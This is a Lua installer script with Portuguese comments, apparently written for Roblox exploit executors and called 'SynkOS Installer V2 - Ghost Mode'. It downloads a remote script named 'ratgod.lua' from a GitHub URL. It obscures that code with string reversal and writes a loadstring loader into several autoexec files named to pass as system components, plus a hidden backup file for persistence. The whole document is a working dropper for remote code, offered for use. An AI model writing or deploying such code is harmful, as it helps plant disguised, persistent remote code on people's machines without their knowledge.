--[[
💀 SynkOS Installer V2 - Ghost Mode by Raul
Autoexec com persistência, disfarce, executor check e criptografia leve
]]

-- 🧠 Verifica se o executor tem suporte
local function executorCompativel()
    return writefile and readfile and isfile and makefolder
end

if not executorCompativel() then
    warn("Executor fraco ou sem suporte a autoexec.")
    return
end

-- 🔍 Identificar executor (pode ser usado pra logs depois)
local function identificarExecutor()
    if syn then return "Synapse X"
    elseif KRNL_LOADED then return "KRNL"
    elseif isexecutorclosure then return "ExecutorClosure"
    elseif getexecutorname then return getexecutorname()
    elseif identifyexecutor then return identifyexecutor()
    else return "Desconhecido" end
end

local execName = identificarExecutor()
print("[SynkOS] Executor identificado:", execName)

-- 🌐 Baixar o código original do seu GitHub (troca essa URL!)
local URL = "https://raw.githubusercontent.com/seunick/synkos/main/ratgod.lua"
local success, codigoOriginal = pcall(function()
    return game:HttpGet(URL)
end)

if not success or not codigoOriginal then
    warn("[SynkOS] Falha ao baixar o script base.")
    return
end

-- 🧪 Criptografar código com reverso
local codigoCriptografado = string.reverse(codigoOriginal)
local loader = [[
local decode = function(s) return string.reverse(s) end
local script = decode([==[ ]] .. codigoCriptografado .. [[ ]==])
local func = loadstring(script)
if func then pcall(func) end
]]

-- 💾 Nomes aleatórios disfarçados
local nomes = {
    "autoexec/systemUpdater.lua",
    "autoexec/network.lua",
    "autoexec/core_patch.lua",
    "autoexec/init_kernel.lua",
    "autoexec/analytics_module.lua"
}

-- 🧷 Criar todos os arquivos fantasmas
for _, nome in pairs(nomes) do
    pcall(function()
        writefile(nome, loader)
        print("[SynkOS] Instalado:", nome)
    end)
end

-- 🧿 Backup reserva criptografado
local backup = "autoexec/.cache_hidden_" .. tostring(math.random(1000,9999)) .. ".lua"
pcall(function()
    writefile(backup, loader)
end)

print("[SynkOS] Instalador finalizado.")
